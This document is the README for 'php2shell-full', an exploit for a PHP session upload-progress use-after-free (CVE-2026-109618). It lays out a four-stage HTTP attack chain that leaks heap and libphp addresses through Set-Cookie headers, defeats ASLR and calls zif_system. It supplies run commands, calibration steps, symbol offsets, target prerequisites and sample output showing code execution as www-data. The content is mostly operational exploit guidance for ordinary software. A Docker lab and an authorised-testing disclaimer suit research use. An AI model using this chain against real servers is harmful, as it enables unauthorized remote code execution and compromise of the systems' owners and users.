# php2shell-full — CVE-2026-109618 Pure-HTTP RCE Exploit

A clean-room implementation of the php2shell exploit chain for CVE-2026-109618 (PHP session upload-progress use-after-free). All four stages run over plain HTTP — no SSH, no gdb, no server-side access required.

## The Vulnerability

PHP versions 5.4 through 8.4.26 (unpatched) contain a use-after-free in the session upload-progress handler. When a multipart POST triggers an out-of-memory fatal error during `rfc1867.c` parsing, the internal pointers `PS(http_session_vars)` and `PS(id)` are left dangling into freed heap memory. A follow-up request can exploit this dangling state to achieve remote code execution.

**Fixed in:** PHP 8.2.35, 8.3.36, 8.4.27, 8.5.12. PHP 7.x has no fix (EOL).

## How It Works

```
Stage 0: Rotate    Kill the current worker → prefork spawns a fresh child
                   with a predictable heap layout

Stage 1: Heap Leak  OOM crash leaves PS(id) dangling → spray POST fields
                    to overwrite zend_string.len → Set-Cookie dumps 4096
                    heap bytes → majority-vote 2MB-aligned pointers
                    → Zend MM chunk base address

Stage 2: libphp    OOM crash again → spray a 16-element HashTable whose
         Leak      pDestructor overlaps PS(id)->val → Set-Cookie leaks
                   the ZVAL_PTR_DTOR function pointer → subtract offset
                   → libphp.so base address (ASLR defeated)

Stage 3: Fire      Final OOM crash → spray 15 copies of a 167-byte forged
                   HashTable (pDestructor = zif_system) + 2 copies of a
                   55-byte fake reference → cleanup walks the chain
                   → zif_system("id>/tmp/p1") → uid=33(www-data)
```

## Prerequisites

The target must have:

| Requirement | Why |
|---|---|
| `mod_php` with Apache `prefork` | The worker must survive the OOM fatal and handle the next request (FPM workers exit on fatal) |
| `MaxRequestWorkers 1` | ARM and FIRE must hit the same worker process |
| `session.upload_progress.enabled=1` | The upload-progress session hook is the UAF trigger |
| `session.use_strict_mode=0` | Attacker-controlled session IDs must be adopted |
| `display_errors=1` | The in-band fatal error keeps the worker alive |
| `memory_limit` ≤ 8M | The 1MB probe must exceed memory_limit to trigger OOM |
| `max_input_vars=1000` | Controls the amplifier behaviour |

## Quick Start

### 1. Start the vulnerable target

```bash
cd docker
docker compose up -d
```

This builds and runs a single-worker Apache + PHP 8.4.26 container on port 8088.

Verify it's up:

```bash
curl http://127.0.0.1:8088/index.php
# → OK
```

### 2. Get the offsets (optional — defaults work with the shipped Docker image)

Every PHP build has different symbol offsets. The defaults match the shipped Dockerfile. For a custom target, extract them:

```bash
./docker/get-offsets.sh
# → DTOR_OFFSET=0x65eb60
# → ZIF_OFFSET=0x465370
```

### 3. Calibrate

The heap spray parameters (`stage1_n`, `stage2_t`) depend on the allocator layout. Calibrate once:

```bash
python3 php2shell-full.py -u http://127.0.0.1:8088/index.php \
  --calibrate --cal-range1 800:900 --cal-range2 380:420
```

Or with a known `stage1_n`, just sweep stage 2:

```bash
python3 php2shell-full.py -u http://127.0.0.1:8088/index.php \
  --stage1-n 841 --calibrate --cal-range2 400:410
```

Output:

```
  🎯 n=841 → chunk_base = 0x7fba96000000
  🎯 t=406 → libphp_base = 0x7fba97c61000

[calibration complete]
  --stage1-n 841 --stage2-t 406
```

### 4. Fire

```bash
python3 php2shell-full.py -u http://127.0.0.1:8088/index.php \
  --stage1-n 841 --stage2-t 406 -c "id>/tmp/p1"
```

Output:

```
[stage 1] 🎯 chunk_base = 0x7fba96000000
[stage 2] 🎯 libphp_base = 0x7fba97c61000
  zif_system  = 0x7fba980c6370

[stage 3] fire → zif_system("id>/tmp/p1")
```

### 5. Verify RCE

```bash
docker exec $(docker ps -q -f ancestor=php2shell-release) cat /tmp/p1
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Offsets

The default offsets are for `php:8.4.26-apache` (Debian, Apache 2.4.69):

| Offset | Default | How to get |
|---|---|---|
| `DTOR` (zval_ptr_dtor) | `0x65EB60` | `nm -D libphp.so \| grep zval_ptr_dtor` |
| `ZIF` (zif_system) | `0x465370` | `objdump -d libphp.so \| grep '<zif_system>:'` |
| `HTDATA` | `0x690D8` | calibrate on identical build |
| `stage1_n` | 841 | `--calibrate` |
| `stage2_t` | 406 | `--calibrate` |

For a different PHP build, supply your offsets:

```bash
python3 php2shell-full.py -u http://TARGET/index.php \
  --dtor-offset 0xABCDEF --zif-offset 0x123456 --calibrate
```

## What Gets Leaked

### Stage 1 — Set-Cookie heap dump

The forged `zend_string.len=0x1000` causes PHP to URL-encode 4096 bytes of heap into the `Set-Cookie: PHPSESSID=` header:

```
Set-Cookie: PHPSESSID=LAAAAAA...%A0p%0A%96%BA%7F%00%00...
                      ^marker    ^heap pointer (0x7fba960a70a0)
```

The exploit extracts 8-byte values, masks to 2MB alignment, majority-votes → **chunk base**.

### Stage 2 — Set-Cookie pDestructor

The spray overlaps `PS(id)->val` with a HashTable's `pDestructor` field:

```
Set-Cookie: PHPSESSID=%10%00%00%00%00%00%00%00%60%FB%2B%98%BA%7F%00%00
                       ^nTableSize (16)        ^zval_ptr_dtor address
```

Bytes 8–16 decode to `0x7fba982bfb60` = `zval_ptr_dtor`. Subtract `DTOR_OFFSET` → **libphp base**.

## Limitations

- **Single-worker only.** With multiple workers, the ARM and FIRE hit different processes. The exploit has no way to pin requests to a specific worker.
- **mod_php only.** PHP-FPM workers exit on fatal error — the dangling pointer dies with the process.
- **Per-build calibration.** The heap spray parameters depend on the exact PHP binary, libc version, and compiler flags. Same package version ≠ same offsets if the base image was rebuilt.
- **14-byte command limit.** The 167-byte carrier has 14 bytes for the command string. Use `sh</tmp/c` (8 bytes) to chain longer commands via a script file.
- **~60% reliability per attempt.** The heap layout race means the spray sometimes misses. The exploit retries with a fresh worker rotation.

## File Structure

```
php2shell-release/
├── README.md                  ← this file
├── php2shell-full.py          ← the exploit (707 lines, pure Python 3, no dependencies)
└── docker/
    ├── Dockerfile             ← vulnerable target (php:8.4.26-apache, single worker)
    ├── docker-compose.yml     ← one-command lab setup
    └── get-offsets.sh         ← extract DTOR/ZIF from the running container
```

## CLI Reference

```
usage: php2shell-full.py [-h] -u URL [-c CMD] [--proof PROOF] [--fetch FETCH]
                         [--dtor-offset HEX] [--zif-offset HEX]
                         [--htdata-offset HEX] [--stage1-n N] [--stage2-t T]
                         [--calibrate] [--cal-range1 START:STOP]
                         [--cal-range2 START:STOP] [--retries N]
                         [--no-rotate] [-q]

Options:
  -u, --url URL           Target PHP page (http://host:port/path)
  -c, --cmd CMD           Command to execute (max 14 bytes, default: id>/tmp/p1)
  --proof PROOF           Local file to check for command output
  --fetch FETCH           GET this path after fire (e.g. /out/p1)
  --dtor-offset HEX       zval_ptr_dtor offset in libphp.so (default: 0x65eb60)
  --zif-offset HEX        zif_system offset in libphp.so (default: 0x465370)
  --htdata-offset HEX     Chunk-relative offset of the 167-byte string (default: 0x690d8)
  --stage1-n N            Heap leak spray count (skip sweep)
  --stage2-t T            libphp leak spray index (skip sweep)
  --calibrate             Sweep stage1_n/stage2_t to find correct values
  --cal-range1 START:STOP Calibration sweep range for stage 1 (default 100:1500)
  --cal-range2 START:STOP Calibration sweep range for stage 2 (default 1:983)
  --retries N             Retries per stage (default 3)
  --no-rotate             Skip initial worker rotation
  -q, --quiet             Suppress progress output
```

## Credits

- **Author:** phulelouch
- **Vulnerability discovery:** [calif.io](https://calif.io) research team
- **9bie:** Original 3-stage ASLR bypass chain (Set-Cookie OOB read)
- **phulelouch:** Clean-room reimplementation, self-calibration mode, Docker lab, testing framework

## Legal

This tool is provided for authorised security testing and research purposes only. Unauthorised use against systems you do not own or have explicit permission to test is illegal. The authors accept no responsibility for misuse.
